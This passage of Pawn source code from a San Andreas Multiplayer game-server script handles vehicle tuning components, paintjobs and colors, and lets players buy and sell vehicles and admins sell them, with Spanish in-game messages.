        case 558: return (componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093);
        case 559: return (componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009);
        case 560: return (componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031);
        case 561: return (componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057);
        case 562: return (componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039);
        case 565: return (componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048);
        case 566: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 567: return (componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133);
        case 575: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 576: return (componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134);
        case 579: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 580: return (componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 585: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 587: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 589: return (componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 600: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 602: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 603: return (componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
    }
    return false;
}

public OnVehiclePaintjob(playerid, vehicleid,paintjobid)
{
	if(onsys[vehicleid] == 1) {
		SavePaintjob(vehicleid,paintjobid);
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid,color1,color2)
{
	if(onsys[vehicleid] == 1) {
		SaveColors(vehicleid,color1,color2);
	}
	return 1;
}

public SaveComponent(vehicleid,componentid)
{
	new playerid = GetDriverID(vehicleid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
		if (strcmp(VehicleInfo[vehicleid][owner],PlayerInfo[playerid][name],false) == 0) {
			for(new s=0; s<20; s++) {
				if(componentid == spoiler[s][0]) {
					VehicleInfo[vehicleid][mod1] = componentid;
				}
			}
			for(new s=0; s<3; s++) {
				if(componentid == nitro[s][0]) {
					VehicleInfo[vehicleid][mod2] = componentid;
				}
			}
			for(new s=0; s<23; s++) {
				if(componentid == fbumper[s][0]) {
					VehicleInfo[vehicleid][mod3] = componentid;
				}
			}
			for(new s=0; s<22; s++) {
				if(componentid == rbumper[s][0]) {
					VehicleInfo[vehicleid][mod4] = componentid;
				}
			}
			for(new s=0; s<28; s++) {
				if(componentid == exhaust[s][0]) {
					VehicleInfo[vehicleid][mod5] = componentid;
				}
			}
			for(new s=0; s<2; s++) {
				if(componentid == bventr[s][0]) {
					VehicleInfo[vehicleid][mod6] = componentid;
				}
			}
			for(new s=0; s<2; s++) {
				if(componentid == bventl[s][0]) {
					VehicleInfo[vehicleid][mod7] = componentid;
				}
			}
			for(new s=0; s<4; s++) {
				if(componentid == bscoop[s][0]) {
					VehicleInfo[vehicleid][mod8] = componentid;
				}
			}
			for(new s=0; s<13; s++) {
				if(componentid == rscoop[s][0]) {
					VehicleInfo[vehicleid][mod9] = componentid;
				}
			}
			for(new s=0; s<21; s++) {
				if(componentid == lskirt[s][0]) {
					VehicleInfo[vehicleid][mod10] = componentid;
				}
			}
			for(new s=0; s<21; s++) {
				if(componentid == rskirt[s][0]) {
					VehicleInfo[vehicleid][mod11] = componentid;
				}
			}
			for(new s=0; s<1; s++) {
				if(componentid == hydraulics[s][0]) {
					VehicleInfo[vehicleid][mod12] = componentid;
				}
			}
			for(new s=0; s<1; s++) {
				if(componentid == base[s][0]) {
					VehicleInfo[vehicleid][mod13] = componentid;
				}
			}
			for(new s=0; s<2; s++) {
				if(componentid == rbbars[s][0]) {
					VehicleInfo[vehicleid][mod14] = componentid;
				}
			}
			for(new s=0; s<2; s++) {
				if(componentid == fbbars[s][0]) {
					VehicleInfo[vehicleid][mod15] = componentid;
				}
			}
			for(new s=0; s<17; s++) {
				if(componentid == wheels[s][0]) {
					VehicleInfo[vehicleid][mod16] = componentid;
				}
			}
			for(new s=0; s<2; s++) {
				if(componentid == lights[s][0]) {
					VehicleInfo[vehicleid][mod17] = componentid;
				}
			}
			return 1;
		}
	}
	return 0;
}

stock SavePaintjob(vehicleid,paintjobid)
{
	new playerid = GetDriverID(vehicleid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
		if (strcmp(VehicleInfo[vehicleid][owner],PlayerInfo[playerid][name],false) == 0) {
			VehicleInfo[vehicleid][paintjob] = paintjobid;
			return 1;
		}
	}
	return 0;
}

stock SaveColors(vehicleid,color1,color2)
{
	new playerid = GetDriverID(vehicleid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
		if (strcmp(VehicleInfo[vehicleid][owner],PlayerInfo[playerid][name],false) == 0) {
			VehicleInfo[vehicleid][color_1] = color1;
			VehicleInfo[vehicleid][color_2] = color2;
			return 1;
		}
	}
	return 0;
}

stock buycar(playerid)
{
	new string[128];
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(passenger[playerid] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser el conductor.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 0) {
		SendClientMessage(playerid, red, "|Error| » {EAEAEA}Debes estar en el vehiculo.");
		return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
		format(string, sizeof(string), "|Error| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ya es tuyo.", VehicleInfo[GetPlayerVehicleID(playerid)][name], PlayerInfo[playerid][name]);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][bought] == 1) {
		format(string, sizeof(string), "|Error| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} le pertenece a {0080FF}%s", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
		SendClientMessage(playerid, red, string);
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 1) && (PlayerInfo[playerid][vowner2] == 1) && (PlayerInfo[playerid][vowner3] == 1) && (PlayerInfo[playerid][vowner4] == 1) && (PlayerInfo[playerid][vowner5] == 1) && (PlayerInfo[playerid][vowner6] == 1) && (PlayerInfo[playerid][vowner7] == 1) && (PlayerInfo[playerid][vowner8] == 1)){
	    if((PlayerInfo[playerid][vowner9] == 1) && (PlayerInfo[playerid][vowner10] == 1)) {
			SendClientMessage(playerid, RED, "|Error| »{EAEAEA} Solo puedes comprar 10 vehiculos.");
			return 1;
		}
	}
	new cash[MAX_PLAYERS];
	cash[playerid] = GetPlayerMoney(playerid);
	if(cash[playerid] >= VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost]) {
		new stringa[128];
		strmid(VehicleInfo[GetPlayerVehicleID(playerid)][owner], PlayerInfo[playerid][name], 0, strlen(PlayerInfo[playerid][name]), 255);
		VehicleInfo[GetPlayerVehicleID(playerid)][bought] = 1;
		if(PlayerInfo[playerid][vowner] == 0){
			PlayerInfo[playerid][vowner] = 1;
			PlayerInfo[playerid][vowned] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #1.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner2] == 0){
			PlayerInfo[playerid][vowner2] = 1;
			PlayerInfo[playerid][vowned2] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #2.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner3] == 0){
			PlayerInfo[playerid][vowner3] = 1;
			PlayerInfo[playerid][vowned3] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #3.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner4] == 0){
			PlayerInfo[playerid][vowner4] = 1;
			PlayerInfo[playerid][vowned4] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #4.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner5] == 0){
			PlayerInfo[playerid][vowner5] = 1;
			PlayerInfo[playerid][vowned5] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #5.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner6] == 0){
			PlayerInfo[playerid][vowner6] = 1;
			PlayerInfo[playerid][vowned6] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #6.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner7] == 0){
			PlayerInfo[playerid][vowner7] = 1;
			PlayerInfo[playerid][vowned7] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #7.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner8] == 0){
			PlayerInfo[playerid][vowner8] = 1;
			PlayerInfo[playerid][vowned8] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #8.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner9] == 0){
			PlayerInfo[playerid][vowner9] = 1;
			PlayerInfo[playerid][vowned9] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #9.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		else if(PlayerInfo[playerid][vowner10] == 0){
			PlayerInfo[playerid][vowner10] = 1;
			PlayerInfo[playerid][vowned10] = GetPlayerVehicleID(playerid);
			format(stringa, sizeof(stringa), "|Info| »{EAEAEA} Acabas de comprar el vehiculo {5783C2}%s.{EAEAEA} Se guardo en la ranura #10.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, stringa);
		}
		GivePlayerMoney(playerid, -VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost]);
//		format(stringa, sizeof(stringa), "You just bought this %s for $%d.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
//		SendClientMessage(playerid, COLOR_GREEN, stringa);
		SavePlayer(playerid);
		SaveVehicles();
		return 1;
	}
	if(cash[playerid] < VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost]) {
		new string6[129];
		format(string6, sizeof(string6), "|Error| »{EAEAEA} Necesitas tener {52C433}$%d{EAEAEA} para comprar este vehiculo.", VehicleInfo[GetPlayerVehicleID(playerid)][vehiclecost],VehicleInfo[GetPlayerVehicleID(playerid)][name]);
		SendClientMessage(playerid, red, string6);
		return 1;
	}
	return 1;
}

stock sellcar(playerid)
{
	new string[128];
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(passenger[playerid] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser el conductor.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el vehiculo.");
		return 1;
	}
	new vehicleID = GetPlayerVehicleID(playerid);
	#if defined TEMP_PARK
	VehicleInfo[vehicleID][x_spawn] = VehicleInfo[vehicleID][ox_spawn];
	VehicleInfo[vehicleID][y_spawn] = VehicleInfo[vehicleID][oy_spawn];
	VehicleInfo[vehicleID][z_spawn] = VehicleInfo[vehicleID][oz_spawn];
	VehicleInfo[vehicleID][za_spawn] = VehicleInfo[vehicleID][oza_spawn];
	#endif
	if (strcmp(VehicleInfo[vehicleID][owner],PlayerInfo[playerid][name],false) == 0) {
		SetVehicleToRespawn(vehicleID);
		SetVehicleVirtualWorld(vehicleID,10);
		SetTimerEx("EraseVehicle",5000,0,"i",vehicleID);
		if(PlayerInfo[playerid][vowned] == vehicleID){
			PlayerInfo[playerid][vowner] = 0;
			PlayerInfo[playerid][vowned] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #1 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned2] == vehicleID){
			PlayerInfo[playerid][vowner2] = 0;
			PlayerInfo[playerid][vowned2] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #2 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned3] == vehicleID){
			PlayerInfo[playerid][vowner3] = 0;
			PlayerInfo[playerid][vowned3] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #3 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned4] == vehicleID){
			PlayerInfo[playerid][vowner4] = 0;
			PlayerInfo[playerid][vowned4] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #4 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned5] == vehicleID){
			PlayerInfo[playerid][vowner5] = 0;
			PlayerInfo[playerid][vowned5] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #5 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned6] == vehicleID){
			PlayerInfo[playerid][vowner6] = 0;
			PlayerInfo[playerid][vowned6] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #6 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned7] == vehicleID){
			PlayerInfo[playerid][vowner7] = 0;
			PlayerInfo[playerid][vowned7] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #7 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned8] == vehicleID){
			PlayerInfo[playerid][vowner8] = 0;
			PlayerInfo[playerid][vowned8] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #8 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned9] == vehicleID){
			PlayerInfo[playerid][vowner9] = 0;
			PlayerInfo[playerid][vowned9] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #9 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		else if(PlayerInfo[playerid][vowned10] == vehicleID){
			PlayerInfo[playerid][vowner10] = 0;
			PlayerInfo[playerid][vowned10] = 0;
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender tu vehiculo {5783C2}%s{EAEAEA} #10 por {52C433}$%d.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
			SendClientMessage(playerid, red, string);
		}
		strmid(VehicleInfo[vehicleID][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
		VehicleInfo[vehicleID][bought] = 0;
		VehicleInfo[vehicleID][secure] = 0;
		GivePlayerMoney(playerid, VehicleInfo[vehicleID][vehiclecost]);
//		format(string, sizeof(string), "You just sold your %s for $%d, enjoy the walk!!", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][vehiclecost]);
//		SendClientMessage(playerid, COLOR_BRIGHTRED, string);
		SavePlayer(playerid);
		return 1;
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes vehiculos.");
		return 1;
	}
}

stock asellcar(playerid)
{
	new string[128];
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(passenger[playerid] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser el conductor.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el vehiculo.");
		return 1;
	}
	if (PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],DEFAULT_OWNER,false) == 0) {
			format(string,sizeof(string),"|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} aun esta en venta.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		new file[256];
		new vehicleID = GetPlayerVehicleID(playerid);
		SetVehicleToRespawn(vehicleID);
		SetVehicleVirtualWorld(vehicleID,10);
		SetTimerEx("EraseVehicle",5000,0,"i",vehicleID);
		format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(VehicleInfo[vehicleID][owner]));
		if(fexist(file)) {
			tempid[playerid] = IsPlayerNameOnline(VehicleInfo[vehicleID][owner]);
			if(tempid[playerid] >= 0 && tempid[playerid] <= MAX_PLAYERS) {
				strmid(VehicleInfo[vehicleID][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
				if(PlayerInfo[tempid[playerid]][vowned] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner] = 0;
					PlayerInfo[tempid[playerid]][vowned] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned2] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner2] = 0;
					PlayerInfo[tempid[playerid]][vowned2] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned3] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner3] = 0;
					PlayerInfo[tempid[playerid]][vowned3] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned4] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner4] = 0;
					PlayerInfo[tempid[playerid]][vowned4] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned5] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner5] = 0;
					PlayerInfo[tempid[playerid]][vowned5] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned6] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner6] = 0;
					PlayerInfo[tempid[playerid]][vowned6] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned7] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner7] = 0;
					PlayerInfo[tempid[playerid]][vowned7] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned8] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner8] = 0;
					PlayerInfo[tempid[playerid]][vowned8] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned9] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner9] = 0;
					PlayerInfo[tempid[playerid]][vowned9] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned10] == vehicleID){
					PlayerInfo[tempid[playerid]][vowner10] = 0;
					PlayerInfo[tempid[playerid]][vowned10] = 0;
				}
				VehicleInfo[vehicleID][bought] = 0;
				VehicleInfo[vehicleID][secure] = 0;
				VehicleInfo[vehicleID][asecure] = 0;
				format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[vehicleID][name], PlayerInfo[tempid[playerid]][name]);
				SendClientMessage(playerid, red, string);
				format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} vendio tu vehiculo {5783C2}%s.", PlayerInfo[playerid][name], VehicleInfo[vehicleID][name]);
				SendClientMessage(tempid[playerid], red, string);
				return 1;
			}
			else {
				ResetOfflinePlayerFileV(file, vehicleID);
				format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][owner]);
				SendClientMessage(playerid, red, string);
				return 1;
			}
		}
		if(!fexist(file)) {
			format(string, sizeof(string), "|Info| »{EAEAEA} Acabas de vender el vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[vehicleID][name], VehicleInfo[vehicleID][owner]);
			SendClientMessage(playerid, red, string);
			VehicleInfo[vehicleID][bought] = 0;
			strmid(VehicleInfo[vehicleID][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
			return 1;
		}
	}
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}

stock aresetpall(playerid) {
	new asname[MAX_PLAYER_NAME];
    GetPlayerName(playerid,asname, sizeof(asname));
	new fname[256];
	format(fname,sizeof(fname),"/ladmin/users/%s.sav",udb_encode(asname));

	new vehicleID1 = dini_Int(fname,"vowned");
	new vehicleID2 = dini_Int(fname,"vowned2");
	new vehicleID3 = dini_Int(fname,"vowned3");
	new vehicleID4 = dini_Int(fname,"vowned4");
	new vehicleID5 = dini_Int(fname,"vowned5");
	new vehicleID6 = dini_Int(fname,"vowned6");
	new vehicleID7 = dini_Int(fname,"vowned7");
	new vehicleID8 = dini_Int(fname,"vowned8");
	new vehicleID9 = dini_Int(fname,"vowned9");
	new vehicleID10 = dini_Int(fname,"vowned10");
	new bizID = dini_Int(fname,"bowned");
	if(vehicleID1 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID1][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID1][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID1);
	if(vehicleID2 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID2][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID2][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID2);
